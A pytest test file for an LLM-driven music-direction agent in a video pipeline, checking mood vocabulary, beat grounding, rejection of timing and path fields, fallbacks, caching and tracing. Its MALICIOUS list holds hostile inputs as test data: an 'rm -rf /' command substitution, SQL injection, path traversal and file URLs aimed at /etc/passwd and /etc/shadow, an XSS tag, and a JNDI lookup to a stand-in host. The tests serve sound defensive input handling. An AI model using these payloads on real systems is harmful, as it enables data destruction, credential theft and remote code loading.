"""
Music Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * `mood` comes from the vocabulary the ENGINE actually supports, so the
    direction is renderable rather than merely plausible
  * a section can only sit on a beat the Story anchored; the clip comes from
    that beat and `under_narration` from the Voiceover, never from the reply
  * nothing here can express a time, a tempo, a length or a file
  * with no model the mood is the pipeline's own motion-band choice, and no
    asset is ever named
"""

import json
import typing

import pytest
from pydantic import ValidationError

from agents.artifacts import (ClipPriority, ContentStrategy, Hook, KeyPoint,
                              Mood, Music, MusicSection, NarrationSegment,
                              Story, StoryBeat, Voiceover)
from agents.music import MusicAgent
from agents.tools.llm_tools import LLMClient, LLMReply

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"


# ------------------------------------------------------------- helpers

def music_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=400, tokens_out=300, usd=0.004)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_story(live=True, beats=True):
    bs = [
        StoryBeat(index=1, role="hook", clip_id=LIVELY,
                  narrative="it is already moving"),
        StoryBeat(index=2, role="develop", clip_id=CALM,
                  narrative="how the gears mesh"),
        StoryBeat(index=3, role="ending", clip_id=LIVELY,
                  narrative="one last turn"),
    ] if beats else []
    return Story(domain="model engineering", story_type="reasoned",
                 logline="a gear train built and then run",
                 progression="from parts to motion", beats=bs,
                 insufficient_signal=False, confidence=0.8, live=live)


def a_voiceover(spoken=(1, 3)):
    segs = [NarrationSegment(index=i + 1, beat_index=b,
                             clip_id=LIVELY if b != 2 else CALM,
                             text=f"line for beat {b}")
            for i, b in enumerate(spoken)]
    return Voiceover(domain="model engineering", voiceover_type="reasoned",
                     voice="warm", segments=segs,
                     beats_covered=sorted(spoken),
                     insufficient_signal=False, confidence=0.8, live=True)


def a_strategy(insufficient=False):
    return ContentStrategy(
        domain="model engineering", strategy_type="reasoned",
        central_topic="a working gear train", core_angle="simpler than it looks",
        audience="people who build mechanisms", pacing="fast",
        hook=Hook(clip_id=LIVELY),
        key_points=[KeyPoint(point="it turns", support="vision",
                             clip_ids=[LIVELY])],
        clip_priorities=[ClipPriority(clip_id=LIVELY, priority=1)],
        insufficient_signal=insufficient, confidence=0.8, live=True)


GOOD = {
    "mood": "beat",
    "mood_rationale": "the mechanism has a pulse of its own",
    "tempo_feel": "driving",
    "sonic_direction": "a dry kit with a warm low end, nothing orchestral",
    "instrumentation": ["kick", "shaker", "sub bass"],
    "energy_arc": "opens high, settles, lifts again at the end",
    "avoid": ["strings", "vocal samples"],
    "sections": [
        {"beat_index": 1, "energy": "high", "intent": "hit straight in"},
        {"beat_index": 2, "energy": "steady", "intent": "make room to explain"},
        {"beat_index": 3, "energy": "peak", "intent": "let it land"},
    ],
    "narration_notes": ["pull the bed back under the voice"],
    "risks": ["could feel relentless"],
    "limitations": ["only three beats"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, clip_set=None, story=None, voiceover=None,
        strategy=None, revision=0):
    agent = MusicAgent()
    with tracer_span(ctx, "music") as span:
        return agent.execute(ctx, span, clip_set=clip_set, story=story,
                             voiceover=voiceover, strategy=strategy,
                             revision=revision)


@pytest.fixture
def music_ctx(director_ctx):
    ctx, clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx, clip_set


# ---------------------------- 1. the vocabulary is the engine's

def test_the_mood_literal_matches_the_engine_exactly():
    """If these ever drift, the agent can emit a mood nothing can play."""
    from agents.tools.pipeline_bridge import SERVER_DIR  # noqa: F401
    import extras
    assert list(typing.get_args(Mood)) == list(extras.MOODS)


def test_every_mood_maps_to_a_real_engine():
    from agents.tools.pipeline_bridge import SERVER_DIR  # noqa: F401
    import extras
    for mood in typing.get_args(Mood):
        engine, _args = extras.MOODS[mood]
        assert engine in {"stdlib", "beatbed"}


def test_the_engine_is_derived_from_the_mood(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.mood == "beat"
    assert p.engine == "beatbed", "engine must follow from mood"


def test_a_mood_outside_the_engines_vocabulary_is_replaced(music_ctx,
                                                           tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "mood": "synthwave"})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.mood in typing.get_args(Mood)
    assert p.engine
    assert any("not one the engine supports" in x for x in p.limitations)


@pytest.mark.parametrize("bad", ["", None, 7, "LOFI", "lofi ", {"a": 1}])
def test_a_junk_mood_falls_back_to_a_real_one(music_ctx, tracer_span, bad):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "mood": bad})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.mood in typing.get_args(Mood)


def test_the_prompt_lists_only_the_real_moods(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    seen = []
    ctx.llm = music_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_story())
    for mood in typing.get_args(Mood):
        assert mood in seen[0]
    # short fragment: the full sentence wraps across a newline in the prompt
    assert "nothing can play" in seen[0]
    assert "settings the music engine actually has" in seen[0]


# ---------------------------------------- 2. a valid direction

def test_a_valid_reply_becomes_a_complete_direction(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_voiceover(),
              a_strategy())
    p = art.payload

    assert isinstance(p, Music)
    assert p.music_type == "reasoned"
    assert p.mood == "beat" and p.engine == "beatbed"
    assert p.tempo_feel == "driving"
    assert p.sonic_direction and p.energy_arc
    assert p.instrumentation == ["kick", "shaker", "sub bass"]
    assert p.avoid == ["strings", "vocal samples"]
    assert len(p.sections) == 3
    assert p.live is True
    assert not p.insufficient_signal
    assert art.degraded is False and art.fallback_used is None


def test_the_envelope_is_complete(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_voiceover())
    assert art.artifact_id and art.job_id == ctx.job.job_id
    assert art.kind == "Music"
    assert art.schema_version >= 1 and art.revision == 0
    assert art.produced_by == "music"
    assert art.produced_at > 0 and art.inputs_hash and art.trace_id
    assert 0.0 <= art.confidence <= 1.0
    assert art.cost is not None


# ------------------------------- 3. grounding / reference safety

def test_the_clip_comes_from_the_beat_not_the_reply(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sections": [
        {"beat_index": 1, "energy": "high", "clip_id": "99_invented.mp4"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.sections[0].clip_id == LIVELY     # beat 1's real clip


def test_under_narration_is_derived_from_the_voiceover(music_ctx,
                                                       tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sections": [
        {"beat_index": 1, "under_narration": False},
        {"beat_index": 2, "under_narration": True}]})
    # the voiceover speaks over beats 1 and 3, not 2
    p = run(ctx, tracer_span, clip_set, a_story(),
            a_voiceover(spoken=(1, 3))).payload
    by_beat = {s.beat_index: s.under_narration for s in p.sections}
    assert by_beat[1] is True, "beat 1 is spoken; the reply cannot deny it"
    assert by_beat[2] is False, "beat 2 is silent; the reply cannot claim it"


@pytest.mark.parametrize("bi", [99, 0, -1, "1", 1.5, True, None, {"a": 1}])
def test_a_section_on_a_nonexistent_beat_is_dropped(music_ctx, tracer_span,
                                                    bi):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sections": [
        {"beat_index": bi, "energy": "high"},
        {"beat_index": 2, "energy": "low"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert [s.beat_index for s in p.sections] == [2]
    assert any("does not exist" in x for x in p.limitations)


def test_a_duplicate_section_for_one_beat_is_dropped(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sections": [
        {"beat_index": 1, "energy": "high"},
        {"beat_index": 1, "energy": "low"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert [s.beat_index for s in p.sections] == [1]
    assert p.sections[0].energy == "high"
    assert any("duplicate" in x for x in p.limitations)


def test_sections_are_ordered_by_beat(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sections": [
        {"beat_index": 3, "energy": "peak"},
        {"beat_index": 1, "energy": "high"},
        {"beat_index": 2, "energy": "low"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert [s.beat_index for s in p.sections] == [1, 2, 3]
    assert [s.index for s in p.sections] == [1, 2, 3]


def test_no_asset_is_ever_named(music_ctx, tracer_span):
    """The library is empty here, so a named track would be an invention."""
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sonic_direction": "use epic_theme_v3.mp3"})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.available_assets == [], "the test library holds no audio"
    # the string survives as inert text, but nothing treats it as an asset
    assert "available_assets" in Music.model_fields
    assert all(a in p.available_assets for a in p.available_assets)


def test_available_assets_is_measured_not_model_output(music_ctx,
                                                       tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "available_assets": ["fake.mp3"]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert "fake.mp3" not in p.available_assets


# --------------------------- 4. timestamp / duration rejection

def test_the_schema_makes_timing_structurally_impossible():
    for bad in ({"start": 1.0}, {"end": 2.0}, {"duration": 3.0},
                {"at": 4.0}, {"seconds": 5}, {"bpm": 120},
                {"file_path": "x.mp3"}, {"offset": 2}):
        with pytest.raises(ValidationError):
            MusicSection(index=1, beat_index=1, clip_id="a", **bad)
    for bad in ({"total_duration": 30.0}, {"bpm": 120},
                {"asset_path": "a.wav"}, {"track": "x.mp3"},
                {"ffmpeg_args": "-af x"}):
        with pytest.raises(ValidationError):
            Music(**bad)


def test_no_field_can_hold_a_time_tempo_or_path():
    banned = {"start", "end", "duration", "at", "seconds", "bpm", "tempo",
              "offset", "total_duration", "runtime", "length", "file_path",
              "path", "asset_path", "track", "ffmpeg_args", "filter"}
    for model in (Music, MusicSection):
        assert not (set(model.model_fields) & banned), model.__name__


def test_a_model_sending_timings_is_ignored_not_obeyed(music_ctx,
                                                       tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "bpm": 128, "total_duration": 30.0,
                         "sections": [{"beat_index": 1, "energy": "high",
                                       "start": 0.0, "duration": 9.5,
                                       "bpm": 128}]})
    art = run(ctx, tracer_span, clip_set, a_story())
    dumped = json.dumps(art.payload.model_dump())
    assert "128" not in dumped and "9.5" not in dumped
    assert '"bpm"' not in dumped and '"start"' not in dumped
    assert len(art.payload.sections) == 1


def test_section_indices_must_be_contiguous():
    with pytest.raises(ValidationError):
        Music(sections=[MusicSection(index=1, beat_index=1, clip_id="a"),
                        MusicSection(index=3, beat_index=2, clip_id="b")])


# -------------------------------------- 5. malformed / invalid

@pytest.mark.parametrize("junk", ["not json", "", "[1,2,3]", '{"mood": '])
def test_malformed_replies_fall_back(music_ctx, tracer_span, junk):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(junk)
    art = run(ctx, tracer_span, clip_set, a_story())
    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert isinstance(art.payload, Music)


def test_a_failed_call_falls_back(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = failing_llm()
    art = run(ctx, tracer_span, clip_set, a_story())
    assert art.degraded is True and art.payload.live is False


def test_junk_types_are_survived(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({"mood": {"a": 1}, "mood_rationale": ["x"],
                         "tempo_feel": 9, "sonic_direction": True,
                         "instrumentation": "not a list", "avoid": None,
                         "sections": "not a list", "energy_arc": {"n": 1},
                         "confidence": "high"})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.mood in typing.get_args(Mood)
    assert p.tempo_feel == "moderate"
    assert p.sonic_direction == "", "a bool must not become text"
    assert p.instrumentation == [] and p.avoid == []
    assert p.sections == []
    assert p.confidence == 0.0


@pytest.mark.parametrize("bad", ["loud", "HIGH", "", None, 7])
def test_an_invalid_energy_falls_back_to_steady(music_ctx, tracer_span, bad):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sections": [
        {"beat_index": 1, "energy": bad}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.sections[0].energy == "steady"


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(music_ctx, tracer_span, bad):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "confidence": bad})
    art = run(ctx, tracer_span, clip_set, a_story())
    assert 0.0 <= art.payload.confidence <= 1.0
    assert 0.0 <= art.confidence <= 1.0


def test_lists_and_sections_are_bounded(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    huge = "A" * 5000
    ctx.llm = music_llm({**GOOD, "instrumentation": [huge] * 50,
                         "sonic_direction": huge,
                         "sections": [{"beat_index": 1}] * 200})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert len(p.instrumentation) <= 8
    assert len(p.sonic_direction) <= 300
    assert len(p.sections) <= 12


MALICIOUS = [
    "$(rm -rf /)", "; DROP TABLE artifacts; --", "../../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe", "-af volume=0,amovie=/etc/passwd",
    "' OR '1'='1", "<script>alert(1)</script>", "file:///etc/shadow",
    "\x00truncated", "${jndi:ldap://evil.test/x}",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_string_stays_inert_data(music_ctx, tracer_span, payload):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "sonic_direction": payload,
                         "instrumentation": [payload],
                         "sections": [{"beat_index": 1, "intent": payload}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert isinstance(p.sonic_direction, str)
    again = Music.model_validate_json(p.model_dump_json())
    assert isinstance(again.sonic_direction, str)
    assert again.mood in typing.get_args(Mood)
    assert again.sections[0].clip_id == LIVELY


# ------------------------------------------ 6. fallback behaviour

def test_with_no_api_key_the_mood_is_the_pipelines_own_choice(music_ctx,
                                                              tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    assert not ctx.llm.available()

    art = run(ctx, tracer_span, clip_set, a_story(), a_voiceover())
    p = art.payload

    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert p.live is False and p.model is None
    assert p.mood in typing.get_args(Mood)
    assert p.engine in {"stdlib", "beatbed"}
    assert "measured motion" in p.mood_rationale
    assert p.confidence == 0.0
    assert p.insufficient_signal is True


def test_the_fallback_mood_agrees_with_the_production_bands(music_ctx,
                                                            tracer_span):
    """Same rule the legacy director has always used, on the same numbers."""
    from agents.tools.pipeline_bridge import SERVER_DIR  # noqa: F401
    import director as legacy

    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story()).payload

    motions = sorted(c.motion.mean_ydif for c in clip_set.usable_clips)
    n = len(motions)
    median = (motions[n // 2] if n % 2
              else (motions[n // 2 - 1] + motions[n // 2]) / 2.0)
    expected = next(m for t, m, _ in legacy.MOOD_BANDS if median >= t)
    assert p.mood == expected


def test_the_fallback_invents_no_direction(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.sonic_direction == "", "a fallback must not invent a sound"
    assert p.instrumentation == []
    assert p.energy_arc == "" and p.avoid == []
    assert all(s.intent == "" for s in p.sections)
    assert all(s.energy == "steady" for s in p.sections)


def test_the_fallback_names_no_asset(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.available_assets == []
    assert any("library is empty" in x for x in p.limitations)


def test_the_fallback_still_tracks_narration(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story(),
            a_voiceover(spoken=(1, 3))).payload
    assert [s.beat_index for s in p.spoken_sections] == [1, 3]


def test_no_story_produces_a_minimal_direction(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, None)
    assert art.payload.sections == []
    assert art.payload.story_available is False
    assert art.payload.confidence <= 0.3
    assert any("no story with beats" in x for x in art.payload.limitations)


def test_no_measurements_at_all_still_yields_a_playable_mood(music_ctx,
                                                             tracer_span):
    ctx, _clip_set = music_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, None, a_story()).payload
    assert p.mood in typing.get_args(Mood)
    assert p.engine in {"stdlib", "beatbed"}


def test_a_deterministic_story_caps_confidence(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm({**GOOD, "confidence": 1.0})
    p = run(ctx, tracer_span, clip_set, a_story(live=False)).payload
    assert p.confidence <= 0.5


# ---------------------------------------------- 7. cache behaviour

def test_identical_inputs_hit_the_cache(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    calls = []
    ctx.llm = music_llm(GOOD, record=calls)
    st, vo, cs = a_story(), a_voiceover(), a_strategy()
    first = run(ctx, tracer_span, clip_set, st, vo, cs, revision=0)
    second = run(ctx, tracer_span, clip_set, st, vo, cs, revision=1)
    assert second.artifact_id == first.artifact_id
    assert second.revision == 0
    assert len(calls) == 1


def test_the_cache_invalidates_when_the_story_changes(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    calls = []
    ctx.llm = music_llm(GOOD, record=calls)
    vo = a_voiceover()
    first = run(ctx, tracer_span, clip_set, a_story(), vo, revision=0)
    changed = a_story().model_copy(update={"logline": "a different story"})
    second = run(ctx, tracer_span, clip_set, changed, vo, revision=1)
    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2


def test_the_cache_invalidates_when_the_narration_changes(music_ctx,
                                                          tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, clip_set, st, a_voiceover(spoken=(1,)),
                revision=0)
    second = run(ctx, tracer_span, clip_set, st, a_voiceover(spoken=(1, 2)),
                 revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_the_strategy_changes(music_ctx,
                                                         tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, clip_set, st, None, a_strategy(),
                revision=0)
    changed = a_strategy().model_copy(update={"pacing": "slow"})
    second = run(ctx, tracer_span, clip_set, st, None, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_measurements_change(music_ctx,
                                                        tracer_span):
    """The fallback mood depends on motion, so motion is part of identity."""
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    first = run(ctx, tracer_span, clip_set, a_story(), revision=0)
    louder = clip_set.model_copy(update={"clips": [
        c.model_copy(update={
            "motion": c.motion.model_copy(update={"mean_ydif": 9.9})})
        for c in clip_set.clips]})
    second = run(ctx, tracer_span, louder, a_story(), revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_is_not_time_based(music_ctx, tracer_span):
    import time as _t
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    agent = MusicAgent()
    st, vo = a_story(), a_voiceover()
    with tracer_span(ctx, "music") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, story=st,
                          voiceover=vo, revision=0)
    _t.sleep(1.1)
    with tracer_span(ctx, "music") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, story=st,
                          voiceover=vo, revision=1)
    assert a.inputs_hash == b.inputs_hash


# --------------------------------------- 8. trace + decisions

def test_the_trace_id_reaches_the_artifact(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    agent = MusicAgent()
    with tracer_span(ctx, "music") as span:
        art = agent.execute(ctx, span, clip_set=clip_set, story=a_story())
        assert art.trace_id == span.trace_id
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "music"]
    assert rows and art.artifact_id in rows[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    run(ctx, tracer_span, clip_set, a_story())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "music"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 400 and rows[-1]["tokens_out"] == 300


def test_the_fallback_is_recorded_in_the_trace(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    run(ctx, tracer_span, clip_set, a_story())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "music"]
    assert rows[-1]["fallback_used"]


def test_decisions_use_the_existing_closed_enum(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_voiceover(),
              a_strategy())
    assert art.decisions
    allowed = {"llm", "measurement", "policy", "human", "fallback"}
    for d in art.decisions:
        assert d.what and d.chose and d.why
        assert d.decided_by in allowed, "the closed enum must not be widened"
        assert 0.0 <= d.confidence <= 1.0
    whats = {d.what for d in art.decisions}
    assert "Evidence the music direction was built from" in whats
    assert "Engine" in whats
    assert "Mood" in whats
    assert "Energy arc" in whats


def test_the_engine_decision_is_attributed_to_policy(music_ctx, tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story())
    d = next(d for d in art.decisions if d.what == "Engine")
    assert d.chose == "beatbed"
    assert d.decided_by == "policy", "a derived value is not a model choice"


def test_the_fallback_mood_is_attributed_to_measurement(music_ctx,
                                                        tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, clip_set, a_story())
    d = next(d for d in art.decisions if d.what == "Mood")
    assert d.decided_by == "measurement"
    kinds = {d.decided_by for d in art.decisions}
    assert "llm" not in kinds


def test_narration_awareness_is_attributed_to_measurement(music_ctx,
                                                          tracer_span):
    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_voiceover())
    d = next(d for d in art.decisions if d.what == "Music under narration")
    assert d.decided_by == "measurement"


# ------------------------- 9. the direction reaches the edit

def test_the_director_receives_the_score(music_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = music_ctx
    ctx.llm = music_llm(GOOD)
    music = run(ctx, tracer_span, clip_set, a_story(), a_voiceover()).payload

    seen = []
    ctx.llm = music_llm({"strategy": "s", "opening_rationale": "r",
                         "segments": [{"clip_id": LIVELY,
                                       "target_seconds": 4.0, "reason": "x"}],
                         "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                       music=music, revision=0)

    prompt = seen[0]
    assert "THE SCORE" in prompt
    assert "mood: beat" in prompt
    assert "NOT a tempo or a" in prompt
    assert "You do NOT choose timestamps" in prompt


def test_a_changed_score_invalidates_the_edit_plan_cache(music_ctx,
                                                         tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    one = Music(mood="lofi", sections=[MusicSection(index=1, beat_index=1,
                                                    clip_id=LIVELY)])
    two = Music(mood="beat", sections=[MusicSection(index=1, beat_index=1,
                                                    clip_id=LIVELY)])
    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, music=one, revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, music=two, revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_records_that_it_acted_on_a_score(music_ctx,
                                                       tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    music = Music(mood="beat", engine="beatbed", live=True, confidence=0.8,
                  sections=[MusicSection(index=1, beat_index=1,
                                         clip_id=LIVELY, energy="high")])
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             music=music, revision=0)
    d = next(d for d in art.decisions
             if d.what == "Score direction from the Music agent")
    assert "beat via beatbed" in d.chose
    assert d.decided_by == "policy"


def test_the_director_works_with_no_score(music_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = music_ctx
    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             music=None, revision=0)
    assert art.payload.segments
    assert not any(d.what == "Score direction from the Music agent"
                   for d in art.decisions)


# ------------------------------------------ helpers on the model

def test_section_helpers():
    m = Music(sections=[
        MusicSection(index=1, beat_index=1, clip_id="a", energy="high",
                     under_narration=True),
        MusicSection(index=2, beat_index=2, clip_id="b", energy="low")])
    assert m.energy_shape == ["high", "low"]
    assert [s.beat_index for s in m.spoken_sections] == [1]
    assert m.section_for(2).energy == "low"
    assert m.section_for(9) is None
